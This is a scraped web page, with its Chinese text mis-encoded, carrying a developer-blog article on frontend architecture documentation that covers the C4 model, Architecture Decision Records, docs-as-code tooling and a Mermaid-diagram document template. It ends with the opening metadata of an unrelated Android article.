hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9910c3f857e94b12975be141f221e053~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv546L5aOu5aOu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444584&amp;x-signature=J1T3Vof51RX1ZDdJ3eZOTpTNT3Q%3D" alt="Gemini_Generated_Image_awm4poawm4poawm4.png" loading="lazy"/></p>
<h3 data-id="heading-0">å¼•è¨€ï¼šæ¶æ„å¸ˆçš„â€œèº«åäº‹â€</h3>
<ul>
<li><strong>ç—›ç‚¹ç›´å‡»</strong>ï¼šä½ æ˜¯å¦é‡åˆ°è¿‡è¿™ç§æƒ…å†µï¼Ÿæ–°é¡¹ç›®å¯åŠ¨æ—¶å†™äº†å‡ åé¡µ æ–‡æ¡£ (æ‰“ä¸ªæ¯”æ–¹) ï¼Œä¸‰ä¸ªæœˆåä»£ç æ”¹å¾—é¢ç›®å…¨éï¼Œæ–‡æ¡£å´å†ä¹Ÿæ²¡äººæ‰“å¼€è¿‡ã€‚</li>
<li><strong>æ ¸å¿ƒå†²çª</strong>ï¼šä»£ç æ˜¯å†™ç»™æœºå™¨çœ‹çš„ï¼ˆè¿½æ±‚å‡†ç¡®ï¼‰ï¼Œæ–‡æ¡£æ˜¯å†™ç»™<strong>æœªæ¥çš„å›¢é˜Ÿ</strong>çœ‹çš„ï¼ˆè¿½æ±‚ç†è§£ï¼‰ã€‚</li>
<li><strong>è§‚ç‚¹æŠ›å‡º</strong>ï¼šä¸€ä»½å¥½çš„æ¶æ„æ–‡æ¡£ï¼ˆADD - Architecture Design Documentï¼‰ä¸æ˜¯ç¹æ–‡ç¼›èŠ‚ï¼Œå®ƒæ˜¯å›¢é˜Ÿåä½œçš„â€œå¥‘çº¦â€å’ŒæŠ€æœ¯å†³ç­–çš„â€œé»‘åŒ£å­â€ã€‚</li>
</ul>
<h3 data-id="heading-1">1. æ³•åˆ™ä¸€ï¼šå‡ç»´æ€è€ƒ â€”â€” å¼•å…¥ C4 æ¨¡å‹</h3>
<p><em>ä¸Šä¸€ç¯‡æˆ‘ä»¬è®²äº† UMLï¼ˆå¾®è§‚çš„ç”»ç¬”ï¼‰ï¼Œè¿™ä¸€ç¯‡æˆ‘ä»¬è¦è®²å®è§‚çš„åœ°å›¾ã€‚</em></p>
<ul>
<li>
<p><strong>ä¸ºä»€ä¹ˆè¦å¼•å…¥ C4ï¼Ÿ</strong></p>
<ul>
<li>ä¼ ç»Ÿçš„ 4+1 è§†å›¾å¯¹æ•æ·å¼€å‘æ¥è¯´æœ‰æ—¶è¿‡äºåšé‡ã€‚</li>
<li><strong>C4 æ¨¡å‹</strong> (Context, Containers, Components, Code) åƒ Google Maps ä¸€æ ·ï¼Œæä¾›äº†ä»â€œå…¨çƒâ€åˆ°â€œè¡—é“â€çš„ 4 ä¸ªç¼©æ”¾çº§åˆ«ï¼Œæ›´é€‚åˆç°ä»£ Web åº”ç”¨ã€‚</li>
</ul>
</li>
<li>
<p><strong>å‰ç«¯è§†è§’çš„ C4 æ‹†è§£ï¼ˆå›¾æ–‡ç»“åˆï¼‰ï¼š</strong></p>
<ul>
<li><strong>Level 1: System Context (ç³»ç»Ÿä¸Šä¸‹æ–‡)</strong> ï¼š</li>
<li><em>ç”»ä»€ä¹ˆ</em>ï¼šä½ çš„ Web App å’Œå¤–éƒ¨ç³»ç»Ÿï¼ˆæ”¯ä»˜ç½‘å…³ã€è€åç«¯ã€CDNï¼‰çš„å…³ç³»ã€‚</li>
<li><em>ç»™è°çœ‹</em>ï¼šéæŠ€æœ¯äººå‘˜ã€äº§å“ç»ç†ã€‚</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
  A[ç”µå•†å‰ç«¯] --&gt;|HTTPS| B[æ”¯ä»˜ç½‘å…³]
  A --&gt;|WebSocket| C[å®æ—¶æ¨èæœåŠ¡]
  D[è€åç«¯] --&gt;|REST| A
  E[CDN] --&gt;|é™æ€èµ„æº| A
</code></pre>
<ul>
<li>
<p><strong>Level 2: Containers (å®¹å™¨)</strong> ï¼š</p>
<ul>
<li><em>ç”»ä»€ä¹ˆ</em>ï¼š<strong>è¿™æ˜¯å‰ç«¯æ¶æ„å¸ˆçš„ä¸»æˆ˜åœº</strong>ã€‚SPA å®¢æˆ·ç«¯ã€BFF å±‚ (Node.js)ã€å¾®å‰ç«¯å­åº”ç”¨ã€ç§»åŠ¨ç«¯ WebViewã€‚</li>
<li><em>ç»™è°çœ‹</em>ï¼šå¼€å‘å›¢é˜Ÿã€è¿ç»´ã€‚</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
  subgraph å‰ç«¯æ¶æ„
    A[SPAå®¢æˆ·ç«¯] --&gt;|GraphQL| B[BFFå±‚]
    B --&gt;|RPC| C[å¾®å‰ç«¯å­åº”ç”¨]
    D[ç§»åŠ¨ç«¯WebView] --&gt;|REST| B
  end
</code></pre>
<ul>
<li>
<p><strong>Level 3: Components (ç»„ä»¶)</strong> ï¼š</p>
<ul>
<li><em>ç”»ä»€ä¹ˆ</em>ï¼šä¸æ˜¯ React UI ç»„ä»¶ï¼Œæ˜¯<strong>ä¸šåŠ¡åŠŸèƒ½æ¨¡å—</strong>ï¼ˆå¦‚ï¼šè´­ç‰©è½¦æ§åˆ¶å™¨ã€èº«ä»½è®¤è¯æœåŠ¡ã€æ—¥å¿—æ¨¡å—ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
  A[è´­ç‰©è½¦æ§åˆ¶å™¨] --&gt;|äº‹ä»¶æ€»çº¿| B[åº“å­˜æ ¡éªŒæœåŠ¡]
  A --&gt;|LocalStorage| C[æœ¬åœ°ç¼“å­˜]
  D[èº«ä»½è®¤è¯æ¨¡å—] --&gt;|JWT| E[APIç½‘å…³]
</code></pre>
<ul>
<li>
<p><strong>Level 4: Code (ä»£ç )</strong> ï¼š</p>
<ul>
<li><em>è§‚ç‚¹</em>ï¼š<strong>ä¸è¦ç”»ï¼</strong> ä»£ç å˜åŒ–å¤ªå¿«ï¼Œå›¾é€šè¿‡ IDE è‡ªåŠ¨ç”Ÿæˆå³å¯ï¼Œç”»äº†å¿…æ­»ã€‚</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 data-id="heading-2">2. æ³•åˆ™äºŒï¼šå†³ç­–ç•™ç—• â€”â€” æ¶æ„å†³ç­–è®°å½• (ADR)</h3>
<p><em>è¿™æ˜¯æœ¬æ–‡æœ€â€œç¡¬æ ¸â€ã€æœ€èƒ½ä½“ç°æ¶æ„å¸ˆä»·å€¼çš„éƒ¨åˆ†ã€‚</em></p>
<ul>
<li>
<p><strong>ä»€ä¹ˆæ˜¯ ADRï¼Ÿ</strong></p>
<ul>
<li>æ–‡æ¡£ä¸ä»…è¦è®°å½•â€œç”±äºä»€ä¹ˆï¼ˆResultï¼‰â€ï¼Œæ›´è¦è®°å½•â€œä¸ºä»€ä¹ˆï¼ˆWhyï¼‰â€ã€‚</li>
<li>å¾ˆå¤šæ—¶å€™ï¼Œæ–°åŒäº‹éª‚ä»£ç çƒ‚ï¼Œæ˜¯å› ä¸ºä»–ä»¬ä¸çŸ¥é“å½“å¹´çš„<strong>çº¦æŸæ¡ä»¶</strong>ã€‚</li>
</ul>
</li>
<li>
<p><strong>ADR æ ‡å‡†æ¨¡æ¿ï¼ˆç›´æ¥ç»™å¹²è´§ï¼‰ï¼š</strong></p>
<ul>
<li>
<p><strong>æ ‡é¢˜</strong>ï¼šADR-001 é‡‡ç”¨ Tailwind CSS æ›¿ä»£ Styled-components</p>
</li>
<li>
<p><strong>çŠ¶æ€</strong>ï¼šå·²é€šè¿‡ / å·²åºŸå¼ƒ / æè®®ä¸­</p>
</li>
<li>
<p><strong>èƒŒæ™¯ (Context)</strong> ï¼šç°æœ‰ CSS-in-JS æ–¹æ¡ˆå¯¼è‡´ Bundle ä½“ç§¯è¿‡å¤§ï¼Œä¸”å›¢é˜Ÿå‘½åå›°éš¾ã€‚</p>
</li>
<li>
<p><strong>å†³ç­– (Decision)</strong> ï¼šå…¨çº¿å¼•å…¥ Tailwind CSSã€‚</p>
</li>
<li>
<p><strong>åæœ (Consequences)</strong> ï¼š</p>
<ul>
<li>(+) è¿™é‡Œçš„ HTML ä¼šå˜ä¸‘ã€‚</li>
<li>(+) æ ·å¼æ–‡ä»¶ä½“ç§¯å‡å°‘ 40%ã€‚</li>
<li>(-) éœ€è¦ç»Ÿä¸€é…ç½® ESLint æ’ä»¶è¿›è¡Œç±»åæ’åºã€‚</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>å»ºè®®</strong>ï¼š</p>
<ul>
<li>ä¸è¦æŠŠ ADR å†™åœ¨ Word é‡Œï¼Œè¦æ”¾åœ¨ä»£ç ä»“åº“çš„ <code>/docs/adr</code> ç›®å½•ä¸‹ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-3">3. æ³•åˆ™ä¸‰ï¼šæ–‡æ¡£å³ä»£ç  (Docs as Code)</h3>
<p><em>å¦‚ä½•ä¿è¯æ–‡æ¡£â€œæ´»ç€â€ï¼Ÿè®©å®ƒå’Œä»£ç ä½åœ¨ä¸€èµ·ã€‚</em></p>
<ul>
<li>
<p><strong>å·¥å…·é“¾æ¨è</strong>ï¼š</p>
<ul>
<li><strong>å­˜å‚¨</strong>ï¼šGit ä»“åº“ï¼ˆä¸ <code>package.json</code> åŒçº§ï¼‰ã€‚</li>
<li><strong>ç¼–å†™</strong>ï¼šMarkdownã€‚</li>
<li><strong>ç”»å›¾</strong>ï¼šMermaidï¼ˆç›´æ¥åœ¨ Markdown é‡Œå†™ä»£ç ç”Ÿæˆå›¾ï¼Œä¾¿äº Git Diff å¯¹æ¯”ä¿®æ”¹ï¼‰ã€‚</li>
<li><strong>å‘å¸ƒ</strong>ï¼šVitePress / Docusaurusï¼ˆè‡ªåŠ¨æ„å»ºæˆé™æ€ç«™ç‚¹ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>ç›®å½•ç»“æ„ç¤ºä¾‹</strong>ï¼š</p>
</li>
</ul>
<h3 data-id="heading-4">4. è½åœ°æ¨¡æ¿ï¼šä¸€ä»½â€œä¸è¢«å«Œå¼ƒâ€çš„æ¶æ„æ–‡æ¡£éª¨æ¶</h3>
<ol>
<li>
<p><strong>èƒŒæ™¯ä¸ç›®æ ‡</strong> (1å¥è¯è¯´æ˜é¡¹ç›®ä»·å€¼)</p>
<ul>
<li><strong>[ç—›ç‚¹/ç°çŠ¶]</strong> + <strong>[è§£å†³æ–¹æ¡ˆ]</strong> + <strong>[é‡åŒ–ä»·å€¼]</strong></li>
<li>ç¤ºä¾‹ :  â€œæ‰“é€ ä¼ä¸šçº§å‰ç«¯å¾®æœåŠ¡åŸºåº§ï¼Œé€šè¿‡<strong>å¾®å‰ç«¯æ¶æ„</strong>è§£è€¦å·¨çŸ³åº”ç”¨ï¼Œå®ç°å¤šå›¢é˜Ÿç‹¬ç«‹éƒ¨ç½²ï¼Œå¹¶ç»Ÿä¸€å…¨çº¿äº§å“çš„ UI äº¤äº’ä½“éªŒä¸é‰´æƒé€»è¾‘ã€‚â€</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81b2e83a5ef24c52b84a927a127deb15~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv546L5aOu5aOu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444584&amp;x-signature=e74DRIcI1ti5rnlXOwvT%2FMMWVwY%3D" alt="image.png" loading="lazy"/></p>
</li>
<li>
<p><strong>çº¦æŸæ¡ä»¶</strong> (å¿…é¡»å…¼å®¹ IEï¼Ÿå¿…é¡» 2 å‘¨ä¸Šçº¿ï¼Ÿ)</p>
<ul>
<li>æ ¹æ®å†…éƒ¨è‡ªå®šä¹‰</li>
</ul>
</li>
<li>
<p><strong>ç³»ç»Ÿæ¶æ„å›¾</strong> (ç¤ºä¾‹)</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
%% é‡æ„ç±»é¡¹ç›®
P1["è€æ—§ç³»ç»Ÿ"] --&gt; 
S1["æŠ€æœ¯å‡çº§&lt;br/&gt;React 18 + Vite"] --&gt; 
V1["æ€§èƒ½æå‡&lt;br/&gt;ç»´æŠ¤æˆæœ¬é™ä½"]

%% é«˜å¹¶å‘é¡¹ç›®
P2["CSRç“¶é¢ˆ"] --&gt; 
S2["SSRæ¸²æŸ“&lt;br/&gt;CDNåˆ†å‘"] --&gt; 
V2["SEOä¼˜åŒ–&lt;br/&gt;è½¬åŒ–ç‡æå‡"]

%% ä¸­å°é¡¹ç›®
P3["å·¨çŸ³åº”ç”¨"] --&gt; 
S3["å¾®å‰ç«¯&lt;br/&gt;æ¨¡å—è§£è€¦"] --&gt; 
V3["ç‹¬ç«‹éƒ¨ç½²&lt;br/&gt;å›¢é˜Ÿåä½œä¼˜åŒ–"]

%% æ ·å¼
classDef pStyle fill:#ffebee,stroke:#f44336,color:#b71c1c
classDef sStyle fill:#e3f2fd,stroke:#2196f3,color:#0d47a1
classDef vStyle fill:#e8f5e9,stroke:#4caf50,color:#1b5e20

class P1,P2,P3 pStyle
class S1,S2,S3 sStyle
class V1,V2,V3 vStyle
</code></pre>
</li>
<li>
<p><strong>å…³é”®æŠ€æœ¯é€‰å‹</strong> (é“¾æ¥åˆ°å…·ä½“çš„ ADR æ–‡ä»¶)</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
%% æŠ€æœ¯åˆ†ç±»
æ¡†æ¶é€‰å‹ --&gt; React
æ„å»ºå·¥å…· --&gt; Vite
æ¸²æŸ“æ¨¡å¼ --&gt; NextJS
æ¶æ„æ–¹æ¡ˆ --&gt; Qiankun

%% å…·ä½“æŠ€æœ¯
React["React 18"] --&gt; ADR1[" ADR-001"]
Vite["Vite 5.x"] --&gt; ADR2["ADR-002"]
NextJS[" Next.js SSR"] --&gt; ADR3[" ADR-003"]
Qiankun[" qiankun"] --&gt; ADR4[" ADR-004"]

%% æ›¿ä»£è¯´æ˜
React -.-&gt;|æ›¿ä»£ jQuery| Legacy1
Vite -.-&gt;|æ›¿ä»£ Webpack| Legacy2
NextJS -.-&gt;|ä¼˜åŒ–é¦–å±| Target1["FCP &lt; 1.5s"]
Qiankun -.-&gt;|å¾®å‰ç«¯åŸºåº§| Target2["æ¨¡å—è§£è€¦"]

%% æ ·å¼
classDef cat fill:#f5f5f5,stroke:#616161,font-weight:bold
classDef tech fill:#bbdefb,stroke:#1976d2,color:#0d47a1
classDef adr fill:#c8e6c9,stroke:#388e3c,color:#1b5e20

class æ¡†æ¶é€‰å‹,æ„å»ºå·¥å…·,æ¸²æŸ“æ¨¡å¼,æ¶æ„æ–¹æ¡ˆ cat
class React,Vite,NextJS,Qiankun tech
class ADR1,ADR2,ADR3,ADR4 adr
</code></pre>
</li>
<li>
<p><strong>éåŠŸèƒ½æ€§éœ€æ±‚</strong> (NFRs)</p>
<ul>
<li><em>æ€§èƒ½</em>ï¼šFCP &lt; 1.5s</li>
<li><em>å®‰å…¨</em>ï¼šXSS é˜²æŠ¤ç­–ç•¥</li>
<li><em>ç›‘æ§</em>ï¼šSentry æŠ¥è­¦è§„åˆ™</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    %% æ ¹èŠ‚ç‚¹
    NFRs["éåŠŸèƒ½æ€§éœ€æ±‚"] --&gt; Perf
    NFRs --&gt; Sec
    NFRs --&gt; Mon

    %% æ€§èƒ½éœ€æ±‚
    Perf["æ€§èƒ½éœ€æ±‚&lt;br/&gt;Performance"] --&gt; P1["é¦–å±&lt;1.5s"]
    Perf --&gt; P2["äº¤äº’&lt;100ms"]
    Perf --&gt; P3["èµ„æºä¼˜åŒ–"]

    %% å®‰å…¨éœ€æ±‚
    Sec["å®‰å…¨éœ€æ±‚&lt;br/&gt;Security"] --&gt; S1["XSSé˜²æŠ¤"]
    Sec --&gt; S2["CSRFé˜²æŠ¤"]
    Sec --&gt; S3["æ•°æ®åŠ å¯†"]

    %% ç›‘æ§éœ€æ±‚
    Mon["ç›‘æ§éœ€æ±‚&lt;br/&gt;Monitoring"] --&gt; M1["é”™è¯¯ç‡&lt;0.1%"]
    Mon --&gt; M2["æ€§èƒ½å‘Šè­¦"]
    Mon --&gt; M3["ç”¨æˆ·è¿½è¸ª"]

    %% æ ·å¼
    classDef rootStyle fill:#34495e,stroke:#2c3e50,color:white,font-size:16px
    classDef perfStyle fill:#3498db,stroke:#2980b9,color:white
    classDef secStyle fill:#e74c3c,stroke:#c0392b,color:white
    classDef monStyle fill:#2ecc71,stroke:#27ae60,color:white

    class NFRs rootStyle
    class Perf,P1,P2,P3 perfStyle
    class Sec,S1,S2,S3 secStyle
    class Mon,M1,M2,M3 monStyle
</code></pre>
</li>
</ol>
<hr/>
<h3 data-id="heading-5">æ¦‚æ‹¬æ€»ç»“</h3>
<blockquote>
<p><strong>â€œæ¶æ„å¸ˆçš„äº§å‡ºä¸æ˜¯æ–‡æ¡£ï¼Œè€Œæ˜¯å…±è¯†ã€‚â€</strong></p>
<p>å¥½çš„æ¶æ„æ–‡æ¡£ï¼Œä¸æ˜¯ä¸ºäº†è¯æ˜ä½ é€šè¿‡äº†ç­”è¾©ï¼Œè€Œæ˜¯ä¸ºäº†è®©æ–°å…¥èŒçš„åŒå­¦åœ¨ä¸€å¹´åçœ‹åˆ°è¿™è¡Œä»£ç æ—¶ï¼Œèƒ½é€šè¿‡æ–‡æ¡£é‡Œçš„ ADR æ˜ç™½ï¼š <strong>â€œå“¦ï¼ŒåŸæ¥å½“åˆæ˜¯ä¸ºäº†æ€§èƒ½æ‰å†™å¾—è¿™ä¹ˆâ€˜å¥‡æ€ªâ€™çš„ã€‚â€</strong></p>
<p>è¿™å°±æ˜¯æ–‡æ¡£çš„ä»·å€¼â€”â€”ç©¿è¶Šæ—¶é—´çš„æ²Ÿé€šã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è‡ªå®šä¹‰view, å›¾ç‰‡å³ä¸Šè§’æ˜¾ç¤ºæ•°å­—]]></title>    <link>https://juejin.cn/post/7592451588848631827</link>    <guid>https://juejin.cn/post/7592451588848631827</guid>    <pubDate>2026-01-08T02:36:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592451588848631827" data-draft-id="7592452108798509099" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è‡ªå®šä¹‰view, å›¾ç‰‡å³ä¸Šè§’æ˜¾ç¤ºæ•°å­—"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-08T02:36:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¥¥é™Œé™Œ"/> <meta itemprop="url" content="https://juejin.cn/user/1500168453892327"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è‡ªå®šä¹‰view, å›¾ç‰‡å³ä¸Šè§’æ˜¾ç¤ºæ•°å­—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1500168453892327/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¥¥é™Œé™Œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:36:15.000Z" title="Thu Jan 08 2026 02:36:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
